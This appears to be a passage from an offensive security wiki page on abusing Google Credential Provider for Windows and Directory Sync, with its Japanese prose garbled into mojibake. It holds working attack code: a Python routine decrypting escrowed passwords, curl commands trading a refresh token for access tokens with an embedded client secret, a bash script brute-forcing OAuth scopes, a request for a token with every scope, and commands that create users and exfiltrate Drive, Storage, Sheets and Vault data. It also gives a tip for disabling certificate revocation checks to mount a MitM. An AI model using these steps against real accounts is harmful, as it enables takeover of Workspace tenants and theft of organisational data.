print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

Chromiumã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã§ã“ã‚Œã‚‰ã®ä¸»è¦ãªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* APIãƒ‰ãƒ¡ã‚¤ãƒ³: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹

ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§æŒ‡å®šã•ã‚ŒãŸã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆIDã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - ã‚¹ã‚³ãƒ¼ãƒ—

{% hint style="info" %}
ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æŒã£ã¦ã„ã¦ã‚‚ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã®ãŸã‚ã«ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã—ã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹**ã‚¹ã‚³ãƒ¼ãƒ—ã®ã¿ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§ãã‚‹**ã‹ã‚‰ã§ã™ã€‚

ã¾ãŸã€ãƒªãƒ•ãƒ¬ãƒƒã‚·ãƒ¥ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã™ã¹ã¦ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§æœ‰åŠ¹ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚
{% endhint %}

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€GCPWã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ã™ã¹ã¦ã®å¯èƒ½ãªOAuthã‚¹ã‚³ãƒ¼ãƒ—ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ãŸã‚ã€æ¬¡ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€`refresh_token`ã‚’ä½¿ç”¨ã—ã¦`access_token`ã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã‚¹ã‚³ãƒ¼ãƒ—ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

<details>

<summary>ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã®Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆ</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

ãã—ã¦ã€åŸ·ç­†æ™‚ã«å¾—ã‚‰ã‚ŒãŸå‡ºåŠ›ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
ã•ã‚‰ã«ã€Chromiumã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’ç¢ºèªã™ã‚‹ã¨ã€[**ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24)ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã€**ä»–ã®ã‚¹ã‚³ãƒ¼ãƒ—**ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€**ä»¥å‰ã«ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã•ã‚ŒãŸãƒªã‚¹ãƒˆã«ã¯è¡¨ç¤ºã•ã‚Œãªã„**ã¨è€ƒãˆã‚‰ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚‰ã®è¿½åŠ ã®ã‚¹ã‚³ãƒ¼ãƒ—ãŒè€ƒãˆã‚‰ã‚Œã¾ã™ï¼š

<details>

<summary>è¿½åŠ ã®ã‚¹ã‚³ãƒ¼ãƒ—</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

æœ€ã‚‚èˆˆå‘³æ·±ã„ã®ã¯ãŠãã‚‰ãï¼š
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
ã—ã‹ã—ã€ç§ã¯ã“ã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ä½¿ç”¨ã—ã¦gmailã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ãƒªã‚¹ãƒˆã—ãŸã‚Šã—ã‚ˆã†ã¨ã—ã¾ã—ãŸãŒã€ã†ã¾ãã„ã‹ãªã‹ã£ãŸã®ã§ã€ã©ã‚Œã»ã©å½¹ã«ç«‹ã¤ã®ã‹ã‚ã‹ã‚Šã¾ã›ã‚“ã€‚

**ã™ã¹ã¦ã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚’æŒã¤ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹**:

<details>

<summary>ã™ã¹ã¦ã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚’æŒã¤refresh_tokenã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç”Ÿæˆã™ã‚‹Bashã‚¹ã‚¯ãƒªãƒ—ãƒˆ</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

ã“ã‚Œã‚‰ã®ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ä½¿ç”¨ã—ãŸã„ãã¤ã‹ã®ä¾‹ï¼š

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ç®¡ç†ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¾ã™ã€‚
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>  
</details>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault**ã¯ã€Gmailã€Driveã€Chatãªã©ã®Google Workspaceã‚µãƒ¼ãƒ“ã‚¹ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹çµ„ç¹”ã®ãƒ‡ãƒ¼ã‚¿ã®ãƒ‡ãƒ¼ã‚¿ä¿æŒã€æ¤œç´¢ã€ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã®ãŸã‚ã®ãƒ„ãƒ¼ãƒ«ã‚’æä¾›ã™ã‚‹Google Workspaceã®ã‚¢ãƒ‰ã‚ªãƒ³ã§ã™ã€‚

* Google Workspace Vaultã«ãŠã‘ã‚‹**Matter**ã¯ã€ç‰¹å®šã®ã‚±ãƒ¼ã‚¹ã€èª¿æŸ»ã€ã¾ãŸã¯æ³•çš„å•é¡Œã«é–¢é€£ã™ã‚‹ã™ã¹ã¦ã®æƒ…å ±ã‚’æ•´ç†ã—ã€ã‚°ãƒ«ãƒ¼ãƒ—åŒ–ã™ã‚‹**ã‚³ãƒ³ãƒ†ãƒŠ**ã§ã™ã€‚ã“ã‚Œã¯ã€ãã®ç‰¹å®šã®å•é¡Œã«é–¢é€£ã™ã‚‹**Holds**ã€**Searches**ã€ãŠã‚ˆã³**Exports**ã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã®ä¸­å¤®ãƒãƒ–ã¨ã—ã¦æ©Ÿèƒ½ã—ã¾ã™ã€‚
* Google Workspace Vaultã«ãŠã‘ã‚‹**Hold**ã¯ã€ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ã‚°ãƒ«ãƒ¼ãƒ—ã«é©ç”¨ã•ã‚Œã‚‹**ä¿å­˜ã‚¢ã‚¯ã‚·ãƒ§ãƒ³**ã§ã‚ã‚Šã€Google Workspaceã‚µãƒ¼ãƒ“ã‚¹å†…ã§ã®ãƒ‡ãƒ¼ã‚¿ã®**å‰Šé™¤ã¾ãŸã¯å¤‰æ›´ã‚’é˜²ã**ãŸã‚ã®ã‚‚ã®ã§ã™ã€‚Holdsã¯ã€é–¢é€£æƒ…å ±ãŒæ³•çš„ãªã‚±ãƒ¼ã‚¹ã‚„èª¿æŸ»ã®æœŸé–“ä¸­ã«ç„¡å‚·ã§å¤‰æ›´ã•ã‚Œãªã„ã‚ˆã†ã«ã—ã¾ã™ã€‚
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
More [API endpoints in the docs](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

ã“ã‚Œã¯ã€**ã‚ãªãŸã®ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚°ãƒ«ãƒ¼ãƒ—ã‚’Workspaceã«åŒæœŸã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒ„ãƒ¼ãƒ«**ã§ã™ï¼ˆã“ã®åŸ·ç­†æ™‚ç‚¹ã§ã¯ãã®é€†ã¯ã§ãã¾ã›ã‚“ï¼‰ã€‚

ã“ã‚Œã¯ã€**Workspaceã®ã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ç‰¹æ¨©ã®ã‚ã‚‹ADãƒ¦ãƒ¼ã‚¶ãƒ¼ã®è³‡æ ¼æƒ…å ±**ã‚’å¿…è¦ã¨ã™ã‚‹ãƒ„ãƒ¼ãƒ«ã§ã‚ã‚‹ãŸã‚ã€èˆˆå‘³æ·±ã„ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’æ™‚ã€…åŒæœŸã—ã¦ã„ã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚µãƒ¼ãƒãƒ¼å†…ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

{% hint style="info" %}
**`config-manager.exe`**ãƒã‚¤ãƒŠãƒªã«å¯¾ã—ã¦**MitM**ã‚’å®Ÿè¡Œã™ã‚‹ã«ã¯ã€`config.manager.vmoptions`ãƒ•ã‚¡ã‚¤ãƒ«ã«æ¬¡ã®è¡Œã‚’è¿½åŠ ã—ã¦ãã ã•ã„: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

{% hint style="success" %}
